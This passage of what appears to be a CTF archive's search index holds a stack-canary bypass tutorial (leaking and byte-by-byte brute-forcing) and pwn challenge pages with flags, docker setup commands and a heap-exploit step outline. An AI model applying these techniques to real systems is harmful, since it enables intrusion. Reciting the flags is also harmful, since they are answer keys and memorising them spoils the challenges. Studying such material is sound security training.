            "text": "Stack Canaries\n\n\nStack Canaries are a secret value placed on the stack which changes every time the program is started. Prior to a function return, the stack canary is checked and if it appears to be modified, the program exits immeadiately. \n\n\n\n\nBypassing Stack Canaries\n\n\nStack Canaries seem like a clear cut way to mitigate any stack smashing as it is fairly impossible to just guess a random 64-bit value. However, leaking the address and bruteforcing the canary are two methods which would allow us to get through the canary check.\n\n\nStack Canary Leaking\n\n\nIf we can read the data in the stack canary, we can send it back to the program later because the canary stays the same throughout execution. However Linux makes this slightly tricky by making the first byte of the stack canary a NULL, meaning that string functions will stop when they hit it. A method around this would be to partially overwrite and then put the NULL back or find a way to leak bytes at an arbitrary stack offset.\n\n\nA few situations where you might be able to leak a canary:\n\n\n\n\nUser-controlled format string \n\n\nUser-controlled length of an output\n\n\n\u201cHey, can you send me 1000000 bytes? thx!\u201d\n\n\n\n\n\n\n\n\nBruteforcing a Stack Canary\n\n\nThe canary is determined when the program starts up for the first time which means that if the program forks, it keeps the same stack cookie in the child process. This means that if the input that can overwrite the canary is sent to the child, we can use whether it crashes as an oracle and brute-force 1 byte at a time! \n\n\nThis method can be used on fork-and-accept servers where connections are spun off to child processes, but only under certain conditions such as when the input accepted by the program does not append a NULL byte (\nread\n or \nrecv\n).\n\n\n\n\n\n\n\n\nBuffer (N Bytes)\n\n\n?? ?? ?? ?? ?? ?? ?? ??\n\n\nRBP\n\n\nRIP\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nFill the buffer N Bytes + 0x00 results in no crash\n\n\n\n\n\n\n\n\nBuffer (N Bytes)\n\n\n00 ?? ?? ?? ?? ?? ?? ??\n\n\nRBP\n\n\nRIP\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nFill the buffer N Bytes + 0x00 + 0x00 results in a crash\n\n\nN Bytes + 0x00 + 0x01 results in a crash\n\n\nN Bytes + 0x00 + 0x02 results in a crash\n\n\n...\n\n\nN Bytes + 0x00 + 0x51 results in no crash\n\n\n\n\n\n\n\n\nBuffer (N Bytes)\n\n\n00 51 ?? ?? ?? ?? ?? ??\n\n\nRBP\n\n\nRIP\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nRepeat this bruteforcing process for 6 more bytes...\n\n\n\n\n\n\n\n\nBuffer (N Bytes)\n\n\n00 51 FE 0A 31 D2 7B 3C\n\n\nRBP\n\n\nRIP\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nNow that we have the stack cookie, we can overwrite the RIP register and take control of the program!", 
            "title": "Stack Canaries"
        }, 
        {
            "location": "/binary-exploitation/stack-canaries/#stack-canaries", 
            "text": "Stack Canaries are a secret value placed on the stack which changes every time the program is started. Prior to a function return, the stack canary is checked and if it appears to be modified, the program exits immeadiately.", 
            "title": "Stack Canaries"
        }, 
        {
            "location": "/binary-exploitation/stack-canaries/#bypassing-stack-canaries", 
            "text": "Stack Canaries seem like a clear cut way to mitigate any stack smashing as it is fairly impossible to just guess a random 64-bit value. However, leaking the address and bruteforcing the canary are two methods which would allow us to get through the canary check.", 
            "title": "Bypassing Stack Canaries"
        }, 
        {
            "location": "/binary-exploitation/stack-canaries/#stack-canary-leaking", 
            "text": "If we can read the data in the stack canary, we can send it back to the program later because the canary stays the same throughout execution. However Linux makes this slightly tricky by making the first byte of the stack canary a NULL, meaning that string functions will stop when they hit it. A method around this would be to partially overwrite and then put the NULL back or find a way to leak bytes at an arbitrary stack offset.  A few situations where you might be able to leak a canary:   User-controlled format string   User-controlled length of an output  \u201cHey, can you send me 1000000 bytes? thx!\u201d", 
            "title": "Stack Canary Leaking"
        }, 
        {
            "location": "/binary-exploitation/stack-canaries/#bruteforcing-a-stack-canary", 
            "text": "The canary is determined when the program starts up for the first time which means that if the program forks, it keeps the same stack cookie in the child process. This means that if the input that can overwrite the canary is sent to the child, we can use whether it crashes as an oracle and brute-force 1 byte at a time!   This method can be used on fork-and-accept servers where connections are spun off to child processes, but only under certain conditions such as when the input accepted by the program does not append a NULL byte ( read  or  recv ).     Buffer (N Bytes)  ?? ?? ?? ?? ?? ?? ?? ??  RBP  RIP             Fill the buffer N Bytes + 0x00 results in no crash     Buffer (N Bytes)  00 ?? ?? ?? ?? ?? ?? ??  RBP  RIP             Fill the buffer N Bytes + 0x00 + 0x00 results in a crash  N Bytes + 0x00 + 0x01 results in a crash  N Bytes + 0x00 + 0x02 results in a crash  ...  N Bytes + 0x00 + 0x51 results in no crash     Buffer (N Bytes)  00 51 ?? ?? ?? ?? ?? ??  RBP  RIP             Repeat this bruteforcing process for 6 more bytes...     Buffer (N Bytes)  00 51 FE 0A 31 D2 7B 3C  RBP  RIP             Now that we have the stack cookie, we can overwrite the RIP register and take control of the program!", 
            "title": "Bruteforcing a Stack Canary"
        }, 
        {
            "location": "/binary-exploitation/what-is-lib-c/", 
            "text": "Lib C\n\n\nLibc or the C standard library provides default functions, type definitions, macros, etc. It basically does the heavy lifting for you. Libc is a huge help for attackers as you can spawn a shell provided you have a libc version and offset.", 
            "title": "What is Lib C"
        }, 
        {
            "location": "/binary-exploitation/what-is-lib-c/#lib-c", 
            "text": "Libc or the C standard library provides default functions, type definitions, macros, etc. It basically does the heavy lifting for you. Libc is a huge help for attackers as you can spawn a shell provided you have a libc version and offset.", 
            "title": "Lib C"
        }, 
        {
            "location": "/binary-exploitation/what-is-a-format-string-vulnerability/", 
            "text": "Format String Vulnerability", 
            "title": "What is a Format String Vulnerability"
        }, 
        {
            "location": "/binary-exploitation/what-is-a-format-string-vulnerability/#format-string-vulnerability", 
            "text": "", 
            "title": "Format String Vulnerability"
        }, 
        {
            "location": "/challenges/2017/pwn/Humm_sCh-t/", 
            "text": "Humm_sChat\n\n\nAuthor\n\n\nKyle Martin\n\n\nPoints\n\n\n100\n\n\nCategory\n\n\nPwn\n\n\nDescription\n\n\nI've had no luck running this on anything but Ubuntu 17.10.  Use a sandbox for this - this program is definitely malware.\nHint: to implement: 42 really is the answer to everything\n\n\nFlag\n\n\nflag{fun_f4c7-Humm_s_1s_tur1ng_c0mpl3t3}\n\n\nSolution\n\n\nsolve.py", 
            "title": "Humm_sCh-t"
        }, 
        {
            "location": "/challenges/2017/pwn/Humm_sCh-t/#humm_schat", 
            "text": "", 
            "title": "Humm_sChat"
        }, 
        {
            "location": "/challenges/2017/pwn/Humm_sCh-t/#author", 
            "text": "Kyle Martin", 
            "title": "Author"
        }, 
        {
            "location": "/challenges/2017/pwn/Humm_sCh-t/#points", 
            "text": "100", 
            "title": "Points"
        }, 
        {
            "location": "/challenges/2017/pwn/Humm_sCh-t/#category", 
            "text": "Pwn", 
            "title": "Category"
        }, 
        {
            "location": "/challenges/2017/pwn/Humm_sCh-t/#description", 
            "text": "I've had no luck running this on anything but Ubuntu 17.10.  Use a sandbox for this - this program is definitely malware.\nHint: to implement: 42 really is the answer to everything", 
            "title": "Description"
        }, 
        {
            "location": "/challenges/2017/pwn/Humm_sCh-t/#flag", 
            "text": "flag{fun_f4c7-Humm_s_1s_tur1ng_c0mpl3t3}", 
            "title": "Flag"
        }, 
        {
            "location": "/challenges/2017/pwn/Humm_sCh-t/#solution", 
            "text": "solve.py", 
            "title": "Solution"
        }, 
        {
            "location": "/challenges/2017/pwn/scv/", 
            "text": "SCV\n\n\nAuthor\n\n\nPoints\n\n\n100\n\n\nCategory\n\n\nPwn\n\n\nDescription\n\n\nSCV is too hungry to mine the minerals. Can you give him some food?\n\n\nFlag\n\n\nflag{sCv_0n1y_C0st_50_M!n3ra1_tr3at_h!m_we11}\n \n\n\nSolution\n\n\nSee \nscv.py\n\n\nSetup\n\n\n1.\nsudo docker build -t \nscv\n [Path to Dockerfile]\n\n2.\nsudo docker run --name \nscv\n -d -p [PORT]:[PORT] [IMAGE]", 
            "title": "SCV"
        }, 
        {
            "location": "/challenges/2017/pwn/scv/#scv", 
            "text": "", 
            "title": "SCV"
        }, 
        {
            "location": "/challenges/2017/pwn/scv/#author", 
            "text": "", 
            "title": "Author"
        }, 
        {
            "location": "/challenges/2017/pwn/scv/#points", 
            "text": "100", 
            "title": "Points"
        }, 
        {
            "location": "/challenges/2017/pwn/scv/#category", 
            "text": "Pwn", 
            "title": "Category"
        }, 
        {
            "location": "/challenges/2017/pwn/scv/#description", 
            "text": "SCV is too hungry to mine the minerals. Can you give him some food?", 
            "title": "Description"
        }, 
        {
            "location": "/challenges/2017/pwn/scv/#flag", 
            "text": "flag{sCv_0n1y_C0st_50_M!n3ra1_tr3at_h!m_we11}", 
            "title": "Flag"
        }, 
        {
            "location": "/challenges/2017/pwn/scv/#solution", 
            "text": "See  scv.py", 
            "title": "Solution"
        }, 
        {
            "location": "/challenges/2017/pwn/scv/#setup", 
            "text": "1. sudo docker build -t  scv  [Path to Dockerfile] \n2. sudo docker run --name  scv  -d -p [PORT]:[PORT] [IMAGE]", 
            "title": "Setup"
        }, 
        {
            "location": "/challenges/2017/pwn/pilot/", 
            "text": "PILOT\n\n\nAuthor\n\n\nPoints\n\n\n75\n\n\nCategory\n\n\nPwn\n\n\nDescription\n\n\nCan I take your order? \n16:05 Eastern: Updated binary\n\n\nFlag\n\n\nflag{1nput_c00rd1nat3s_Strap_y0urse1v3s_1n_b0ys}\n \n\n\nSolution\n\n\npilot.py\n\n\nSetup\n\n\n1.\nsudo docker build -t \npilot\n [Path to Dockerfile]\n\n2.\nsudo docker run --name \npilot\n -d -p [PORT]:[PORT] [IMAGE]", 
            "title": "Pilot"
        }, 
        {
            "location": "/challenges/2017/pwn/pilot/#pilot", 
            "text": "", 
            "title": "PILOT"
        }, 
        {
            "location": "/challenges/2017/pwn/pilot/#author", 
            "text": "", 
            "title": "Author"
        }, 
        {
            "location": "/challenges/2017/pwn/pilot/#points", 
            "text": "75", 
            "title": "Points"
        }, 
        {
            "location": "/challenges/2017/pwn/pilot/#category", 
            "text": "Pwn", 
            "title": "Category"
        }, 
        {
            "location": "/challenges/2017/pwn/pilot/#description", 
            "text": "Can I take your order? \n16:05 Eastern: Updated binary", 
            "title": "Description"
        }, 
        {
            "location": "/challenges/2017/pwn/pilot/#flag", 
            "text": "flag{1nput_c00rd1nat3s_Strap_y0urse1v3s_1n_b0ys}", 
            "title": "Flag"
        }, 
        {
            "location": "/challenges/2017/pwn/pilot/#solution", 
            "text": "pilot.py", 
            "title": "Solution"
        }, 
        {
            "location": "/challenges/2017/pwn/pilot/#setup", 
            "text": "1. sudo docker build -t  pilot  [Path to Dockerfile] \n2. sudo docker run --name  pilot  -d -p [PORT]:[PORT] [IMAGE]", 
            "title": "Setup"
        }, 
        {
            "location": "/challenges/2016/pwn/detective/", 
            "text": "Detective\n\n\nAuthor\n\n\nPoints\n\n\n100\n\n\nCategory\n\n\nPwn\n\n\nDescription\n\n\nDear detective, my \"program\" got pwned again. Can you find the culprit for me? \n\n\nMappings for running process on server:\n\n\nStart Addr   End Addr       Size     Offset objfile\n0x56555000 0x56558000     0x3000        0x0 /home/detective/detective\n0x56558000 0x56559000     0x1000     0x2000 /home/detective/detective\n0x56559000 0x5655a000     0x1000     0x3000 /home/detective/detective\n0x5655a000 0x56564000     0xa000        0x0 [heap]\n0xf7e21000 0xf7e22000     0x1000        0x0\n0xf7e22000 0xf7fca000   0x1a8000        0x0 /lib/i386-linux-gnu/libc-2.19.so\n0xf7fca000 0xf7fcb000     0x1000   0x1a8000 /lib/i386-linux-gnu/libc-2.19.so\n0xf7fcb000 0xf7fcd000     0x2000   0x1a8000 /lib/i386-linux-gnu/libc-2.19.so\n0xf7fcd000 0xf7fce000     0x1000   0x1aa000 /lib/i386-linux-gnu/libc-2.19.so\n0xf7fce000 0xf7fd1000     0x3000        0x0\n0xf7fd7000 0xf7fd9000     0x2000        0x0\n0xf7fd9000 0xf7fdb000     0x2000        0x0 [vvar]\n0xf7fdb000 0xf7fdc000     0x1000        0x0 [vdso]\n0xf7fdc000 0xf7ffc000    0x20000        0x0 /lib/i386-linux-gnu/ld-2.19.so\n0xf7ffc000 0xf7ffd000     0x1000    0x1f000 /lib/i386-linux-gnu/ld-2.19.so\n0xf7ffd000 0xf7ffe000     0x1000    0x20000 /lib/i386-linux-gnu/ld-2.19.so\n0xfffdd000 0xffffe000    0x21000        0x0 [stack]\n\n\n\n\n\nHINT:\n\n\n\nHINT:\nso exit does a bit of stuff before it actually exists. try walking through it, you might find something interesting...\n\n\nFlag\n\n\nFLAG{SHERLOCK_HOMLES_NEVER_DIES_HOPE_YOU_ENJOY_REST_OF_CHALLENGES_CSAW2016}\n\n\nSolution\n\n\nanswer.txt\n\n\nSetup\n\n\nTo build\n- \ndocker build -t \ndetective:csaw2016\n .\n\nTo run:\n- \ndocker run -d --name detective -p [4242]:[port] detective:csaw2016\n\n\nNote\n\n\n\n\nport is changeable.\n\n\nPull out libc and compiled executable from the docker instance.\n\n\nNo ASLR. Have a separate box for this challenge.", 
            "title": "Detective"
        }, 
        {
            "location": "/challenges/2016/pwn/detective/#detective", 
            "text": "", 
            "title": "Detective"
        }, 
        {
            "location": "/challenges/2016/pwn/detective/#author", 
            "text": "", 
            "title": "Author"
        }, 
        {
            "location": "/challenges/2016/pwn/detective/#points", 
            "text": "100", 
            "title": "Points"
        }, 
        {
            "location": "/challenges/2016/pwn/detective/#category", 
            "text": "Pwn", 
            "title": "Category"
        }, 
        {
            "location": "/challenges/2016/pwn/detective/#description", 
            "text": "Dear detective, my \"program\" got pwned again. Can you find the culprit for me?   Mappings for running process on server:  Start Addr   End Addr       Size     Offset objfile\n0x56555000 0x56558000     0x3000        0x0 /home/detective/detective\n0x56558000 0x56559000     0x1000     0x2000 /home/detective/detective\n0x56559000 0x5655a000     0x1000     0x3000 /home/detective/detective\n0x5655a000 0x56564000     0xa000        0x0 [heap]\n0xf7e21000 0xf7e22000     0x1000        0x0\n0xf7e22000 0xf7fca000   0x1a8000        0x0 /lib/i386-linux-gnu/libc-2.19.so\n0xf7fca000 0xf7fcb000     0x1000   0x1a8000 /lib/i386-linux-gnu/libc-2.19.so\n0xf7fcb000 0xf7fcd000     0x2000   0x1a8000 /lib/i386-linux-gnu/libc-2.19.so\n0xf7fcd000 0xf7fce000     0x1000   0x1aa000 /lib/i386-linux-gnu/libc-2.19.so\n0xf7fce000 0xf7fd1000     0x3000        0x0\n0xf7fd7000 0xf7fd9000     0x2000        0x0\n0xf7fd9000 0xf7fdb000     0x2000        0x0 [vvar]\n0xf7fdb000 0xf7fdc000     0x1000        0x0 [vdso]\n0xf7fdc000 0xf7ffc000    0x20000        0x0 /lib/i386-linux-gnu/ld-2.19.so\n0xf7ffc000 0xf7ffd000     0x1000    0x1f000 /lib/i386-linux-gnu/ld-2.19.so\n0xf7ffd000 0xf7ffe000     0x1000    0x20000 /lib/i386-linux-gnu/ld-2.19.so\n0xfffdd000 0xffffe000    0x21000        0x0 [stack]  HINT:  HINT:\nso exit does a bit of stuff before it actually exists. try walking through it, you might find something interesting...", 
            "title": "Description"
        }, 
        {
            "location": "/challenges/2016/pwn/detective/#flag", 
            "text": "FLAG{SHERLOCK_HOMLES_NEVER_DIES_HOPE_YOU_ENJOY_REST_OF_CHALLENGES_CSAW2016}", 
            "title": "Flag"
        }, 
        {
            "location": "/challenges/2016/pwn/detective/#solution", 
            "text": "answer.txt", 
            "title": "Solution"
        }, 
        {
            "location": "/challenges/2016/pwn/detective/#setup", 
            "text": "To build\n-  docker build -t  detective:csaw2016  . \nTo run:\n-  docker run -d --name detective -p [4242]:[port] detective:csaw2016", 
            "title": "Setup"
        }, 
        {
            "location": "/challenges/2016/pwn/detective/#note", 
            "text": "port is changeable.  Pull out libc and compiled executable from the docker instance.  No ASLR. Have a separate box for this challenge.", 
            "title": "Note"
        }, 
        {
            "location": "/challenges/2016/pwn/Aul/", 
            "text": "Aul\n\n\nAuthor\n\n\nPoints\n\n\n100\n\n\nCategory\n\n\nPwn\n\n\nDescription\n\n\nWow, this looks like an aul-ful game. I think there is a flag around here somewhere...\n\n\nFlag\n\n\nflag file: \nkey!!!!!!!!!\n\n\nSolution\n\n\nSee \n./solution/solution.txt", 
            "title": "Aul"
        }, 
        {
            "location": "/challenges/2016/pwn/Aul/#aul", 
            "text": "", 
            "title": "Aul"
        }, 
        {
            "location": "/challenges/2016/pwn/Aul/#author", 
            "text": "", 
            "title": "Author"
        }, 
        {
            "location": "/challenges/2016/pwn/Aul/#points", 
            "text": "100", 
            "title": "Points"
        }, 
        {
            "location": "/challenges/2016/pwn/Aul/#category", 
            "text": "Pwn", 
            "title": "Category"
        }, 
        {
            "location": "/challenges/2016/pwn/Aul/#description", 
            "text": "Wow, this looks like an aul-ful game. I think there is a flag around here somewhere...", 
            "title": "Description"
        }, 
        {
            "location": "/challenges/2016/pwn/Aul/#flag", 
            "text": "flag file:  key!!!!!!!!!", 
            "title": "Flag"
        }, 
        {
            "location": "/challenges/2016/pwn/Aul/#solution", 
            "text": "See  ./solution/solution.txt", 
            "title": "Solution"
        }, 
        {
            "location": "/challenges/2016/pwn/WarmUp/", 
            "text": "WarmUp\n\n\nAuthor\n\n\nPoints\n\n\n50\n\n\nCategory\n\n\nPwn\n\n\nDescription\n\n\nSo you want to be a pwn-er huh? Well let's throw you an easy one ;)\n\n\nFlag\n\n\nFLAG{LET_US_BEGIN_CSAW_2016}\n\n\nSolution\n\n\nSee \nwarmup.py", 
            "title": "WarmUp"
        }, 
        {
            "location": "/challenges/2016/pwn/WarmUp/#warmup", 
            "text": "", 
            "title": "WarmUp"
        }, 
        {
            "location": "/challenges/2016/pwn/WarmUp/#author", 
            "text": "", 
            "title": "Author"
        }, 
        {
            "location": "/challenges/2016/pwn/WarmUp/#points", 
            "text": "50", 
            "title": "Points"
        }, 
        {
            "location": "/challenges/2016/pwn/WarmUp/#category", 
            "text": "Pwn", 
            "title": "Category"
        }, 
        {
            "location": "/challenges/2016/pwn/WarmUp/#description", 
            "text": "So you want to be a pwn-er huh? Well let's throw you an easy one ;)", 
            "title": "Description"
        }, 
        {
            "location": "/challenges/2016/pwn/WarmUp/#flag", 
            "text": "FLAG{LET_US_BEGIN_CSAW_2016}", 
            "title": "Flag"
        }, 
        {
            "location": "/challenges/2016/pwn/WarmUp/#solution", 
            "text": "See  warmup.py", 
            "title": "Solution"
        }, 
        {
            "location": "/challenges/2015/pwn/precision/", 
            "text": "Precision\n\n\nAuthor\n\n\nLiang\n\n\nPoints\n\n\n100\n\n\nCategory\n\n\nPwn\n\n\nDescription\n\n\nFlag\n\n\nflag{1_533_y0u_kn0w_y0ur_w4y_4r0und_4_buff3r}\n\n\nSolution\n\n\nSetup", 
            "title": "Precision"
        }, 
        {
            "location": "/challenges/2015/pwn/precision/#precision", 
            "text": "", 
            "title": "Precision"
        }, 
        {
            "location": "/challenges/2015/pwn/precision/#author", 
            "text": "Liang", 
            "title": "Author"
        }, 
        {
            "location": "/challenges/2015/pwn/precision/#points", 
            "text": "100", 
            "title": "Points"
        }, 
        {
            "location": "/challenges/2015/pwn/precision/#category", 
            "text": "Pwn", 
            "title": "Category"
        }, 
        {
            "location": "/challenges/2015/pwn/precision/#description", 
            "text": "", 
            "title": "Description"
        }, 
        {
            "location": "/challenges/2015/pwn/precision/#flag", 
            "text": "flag{1_533_y0u_kn0w_y0ur_w4y_4r0und_4_buff3r}", 
            "title": "Flag"
        }, 
        {
            "location": "/challenges/2015/pwn/precision/#solution", 
            "text": "", 
            "title": "Solution"
        }, 
        {
            "location": "/challenges/2015/pwn/precision/#setup", 
            "text": "", 
            "title": "Setup"
        }, 
        {
            "location": "/challenges/2017/pwn/auir/", 
            "text": "AUIR\n\n\nAuthor\n\n\nPoints\n\n\n200\n\n\nDescription\n\n\nAt long last, we stand at the threshold of destiny. For today, we will restore the glory of our legacy. Today, we will retake what we have lost and reclaim our homeworld. -Artanis-\n\n\nFlag\n\n\nflag{W4rr10rs!_A1ur_4wa1ts_y0u!_M4rch_f0rth_and_t4k3_1t!}\n\n\nSolution\n\n\nauir.py\n\n\nSetup\n\n\n1.\nsudo docker build -t \nauir\n [Path to Dockerfile]\n\n2.\nsudo docker run --name \nauir\n -d -p [PORT]:[PORT] [IMAGE]\n\n\nNote\n\n\n\n\nThe binary is pre-compiled because of ollvm....\n\n\nIt is compiled on Ubuntu 16.04 xenial \n\n\nLibc: libc-2.23.so\n\n\nProbably do not have to give out libc....", 
            "title": "Auir"
        }, 
        {
            "location": "/challenges/2017/pwn/auir/#auir", 
            "text": "", 
            "title": "AUIR"
        }, 
        {
            "location": "/challenges/2017/pwn/auir/#author", 
            "text": "", 
            "title": "Author"
        }, 
        {
            "location": "/challenges/2017/pwn/auir/#points", 
            "text": "200", 
            "title": "Points"
        }, 
        {
            "location": "/challenges/2017/pwn/auir/#description", 
            "text": "At long last, we stand at the threshold of destiny. For today, we will restore the glory of our legacy. Today, we will retake what we have lost and reclaim our homeworld. -Artanis-", 
            "title": "Description"
        }, 
        {
            "location": "/challenges/2017/pwn/auir/#flag", 
            "text": "flag{W4rr10rs!_A1ur_4wa1ts_y0u!_M4rch_f0rth_and_t4k3_1t!}", 
            "title": "Flag"
        }, 
        {
            "location": "/challenges/2017/pwn/auir/#solution", 
            "text": "auir.py", 
            "title": "Solution"
        }, 
        {
            "location": "/challenges/2017/pwn/auir/#setup", 
            "text": "1. sudo docker build -t  auir  [Path to Dockerfile] \n2. sudo docker run --name  auir  -d -p [PORT]:[PORT] [IMAGE]", 
            "title": "Setup"
        }, 
        {
            "location": "/challenges/2017/pwn/auir/#note", 
            "text": "The binary is pre-compiled because of ollvm....  It is compiled on Ubuntu 16.04 xenial   Libc: libc-2.23.so  Probably do not have to give out libc....", 
            "title": "Note"
        }, 
        {
            "location": "/challenges/2017/pwn/zone/", 
            "text": "Zone\n\n\nAuthor\n\n\nPoints\n\n\n300\n\n\nCategory\n\n\nPwn\n\n\nDescription:\n\n\nWe're on a highway to the danger zone.\n\n\nFlag\n\n\nflag{d0n7_let_m3_g3t_1n_my_z0n3}\n\n\nSolution\n\n\n\n\nOverwrite size of next block\n\n\nAllocate next block\n\n\nWhen the block is freed it will go into a different zone\n\n\nAllocate another block from different zone\n\n\nNow you can write more than one byte since different zone thinks the size is much larger\n\n\nOverwrite next pointer of next block to point to stack\n\n\nRop into a leak\n\n\nCall system/magic gadget if that still exists", 
            "title": "Zone"
        }, 
        {
            "location": "/challenges/2017/pwn/zone/#zone", 
            "text": "", 
            "title": "Zone"
        }, 
        {
            "location": "/challenges/2017/pwn/zone/#author", 
            "text": "", 
            "title": "Author"
        }, 
        {
            "location": "/challenges/2017/pwn/zone/#points", 
            "text": "300", 
            "title": "Points"
        }, 
        {
            "location": "/challenges/2017/pwn/zone/#category", 
            "text": "Pwn", 
            "title": "Category"
        }, 
        {
            "location": "/challenges/2017/pwn/zone/#description", 
            "text": "We're on a highway to the danger zone.", 
            "title": "Description:"
        }, 
        {
            "location": "/challenges/2017/pwn/zone/#flag", 
            "text": "flag{d0n7_let_m3_g3t_1n_my_z0n3}", 
            "title": "Flag"
        }, 
        {
            "location": "/challenges/2017/pwn/zone/#solution", 
            "text": "Overwrite size of next block  Allocate next block  When the block is freed it will go into a different zone  Allocate another block from different zone  Now you can write more than one byte since different zone thinks the size is much larger  Overwrite next pointer of next block to point to stack  Rop into a leak  Call system/magic gadget if that still exists", 
            "title": "Solution"
        }, 
        {
            "location": "/challenges/2016/pwn/Tutorial/", 
            "text": "Tutorial\n\n\nAuthor\n\n\nPoints\n\n\n200\n\n\nCategory\n\n\nPwn\n\n\nDescription\n\n\nOk sport, now that you have had your Warmup, maybe you want to checkout the Tutorial.\n\n\nFlag\n\n\nFLAG{3ASY_R0P_R0P_P0P_P0P_YUM_YUM_CHUM_CHUM}\n\n\nSolution\n\n\nSee \ntutorial.py", 
            "title": "Tutorial"
        }, 
        {
            "location": "/challenges/2016/pwn/Tutorial/#tutorial", 
            "text": "", 
            "title": "Tutorial"
        }, 
        {
            "location": "/challenges/2016/pwn/Tutorial/#author", 
            "text": "", 
            "title": "Author"
        }, 
        {
            "location": "/challenges/2016/pwn/Tutorial/#points", 
            "text": "200", 
            "title": "Points"
        }, 
        {
            "location": "/challenges/2016/pwn/Tutorial/#category", 
            "text": "Pwn", 
            "title": "Category"
        }, 
        {
            "location": "/challenges/2016/pwn/Tutorial/#description", 
            "text": "Ok sport, now that you have had your Warmup, maybe you want to checkout the Tutorial.", 
            "title": "Description"
        }, 
        {
            "location": "/challenges/2016/pwn/Tutorial/#flag", 
            "text": "FLAG{3ASY_R0P_R0P_P0P_P0P_YUM_YUM_CHUM_CHUM}", 
            "title": "Flag"
        }, 
        {
            "location": "/challenges/2016/pwn/Tutorial/#solution", 
            "text": "See  tutorial.py", 
            "title": "Solution"
        }, 
        {
            "location": "/challenges/2015/pwn/hipster/", 
            "text": "Hipster Hitler\n\n\nAuthor\n\n\nTaylor\n\n\nPoints\n\n\n250\n\n\nCategory\n\n\nPwn\n\n\nDescription\n\n\nHipster Hitler's got our flag! Help us retrieve it!\nnc 54.164.94.180 1939\n\n\nFlag\n\n\nSolution\n\n\n\n\nhttps://github.com/aweinstock314/aweinstock-ctf-writeups/blob/master/csaw_finals_2015/exploitation250_hipster/exploitation250_hipster_exploit.py\n\n\n\n\nSetup\n\n\nhipster_0ddd47929dca935698b0bb1463d8ae52", 
            "title": "Hipster Hitler"
        }, 
        {
            "location": "/challenges/2015/pwn/hipster/#hipster-hitler", 
            "text": "", 
            "title": "Hipster Hitler"
        }, 
        {
            "location": "/challenges/2015/pwn/hipster/#author", 
            "text": "Taylor", 
            "title": "Author"
        }, 
        {
            "location": "/challenges/2015/pwn/hipster/#points", 
            "text": "250", 
            "title": "Points"
        }, 
        {
            "location": "/challenges/2015/pwn/hipster/#category", 
            "text": "Pwn", 
            "title": "Category"
        }, 
        {
            "location": "/challenges/2015/pwn/hipster/#description", 
            "text": "Hipster Hitler's got our flag! Help us retrieve it!\nnc 54.164.94.180 1939", 
            "title": "Description"
        }, 
        {
            "location": "/challenges/2015/pwn/hipster/#flag", 
            "text": "", 
            "title": "Flag"
        }, 
        {
            "location": "/challenges/2015/pwn/hipster/#solution", 
            "text": "https://github.com/aweinstock314/aweinstock-ctf-writeups/blob/master/csaw_finals_2015/exploitation250_hipster/exploitation250_hipster_exploit.py", 
            "title": "Solution"
        }, 
        {
            "location": "/challenges/2015/pwn/hipster/#setup", 
            "text": "hipster_0ddd47929dca935698b0bb1463d8ae52", 
            "title": "Setup"
        }, 
        {
            "location": "/challenges/2015/pwn/contacts/", 
            "text": "Title\n\n\nAuthor\n\n\nLiang\n\n\nPoints\n\n\n250\n\n\nCategory\n\n\nPwn\n\n\nDescription\n\n\nFlag\n\n\nflag{f0rm47_s7r1ng5_4r3_fun_57uff}\n\n\nSolution\n\n\nSetup", 
            "title": "Contacts"
        }, 
        {
            "location": "/challenges/2015/pwn/contacts/#title", 
            "text": "", 
            "title": "Title"
        }, 
        {
            "location": "/challenges/2015/pwn/contacts/#author", 
            "text": "Liang", 
            "title": "Author"
        }, 
        {
            "location": "/challenges/2015/pwn/contacts/#points", 
            "text": "250", 
            "title": "Points"
        }, 
        {
            "location": "/challenges/2015/pwn/contacts/#category", 
            "text": "Pwn", 
            "title": "Category"
        }, 
        {
            "location": "/challenges/2015/pwn/contacts/#description", 
            "text": "", 
            "title": "Description"
        }, 
        {
            "location": "/challenges/2015/pwn/contacts/#flag", 
            "text": "flag{f0rm47_s7r1ng5_4r3_fun_57uff}", 
            "title": "Flag"
        }, 
        {
            "location": "/challenges/2015/pwn/contacts/#solution", 
            "text": "", 
            "title": "Solution"
        }, 
        {
            "location": "/challenges/2015/pwn/contacts/#setup", 
            "text": "", 
            "title": "Setup"
        }, 
        {
            "location": "/challenges/2015/pwn/autobots/", 
            "text": "Autonots\n\n\nAuthor\n\n\nChung\n\n\nPoints\n\n\n350\n\n\nCategory\n\n\nPwn\n\n\nDescription\n\n\nI hear bots are playing ctfs now.\n\n\nFlag\n\n\nflag{c4nt_w4it_f0r_cgc_7h15_y34r}\n\n\nSolution\n\n\nSetup", 
            "title": "Autobots"
        }, 
        {
            "location": "/challenges/2015/pwn/autobots/#autonots", 
            "text": "", 
            "title": "Autonots"
        }, 
        {
            "location": "/challenges/2015/pwn/autobots/#author", 
            "text": "Chung", 
            "title": "Author"
        }, 
        {
            "location": "/challenges/2015/pwn/autobots/#points", 
            "text": "350", 
            "title": "Points"
        }, 
        {
            "location": "/challenges/2015/pwn/autobots/#category", 
            "text": "Pwn", 
            "title": "Category"
        }, 
        {
            "location": "/challenges/2015/pwn/autobots/#description", 
            "text": "I hear bots are playing ctfs now.", 
            "title": "Description"
        }, 
        {
            "location": "/challenges/2015/pwn/autobots/#flag", 
            "text": "flag{c4nt_w4it_f0r_cgc_7h15_y34r}", 
            "title": "Flag"
        }, 
        {
            "location": "/challenges/2015/pwn/autobots/#solution", 
            "text": "", 
            "title": "Solution"
        }, 
        {
            "location": "/challenges/2015/pwn/autobots/#setup", 
            "text": "", 
            "title": "Setup"
        }, 
        {
            "location": "/challenges/2017/pwn/KWS2/", 
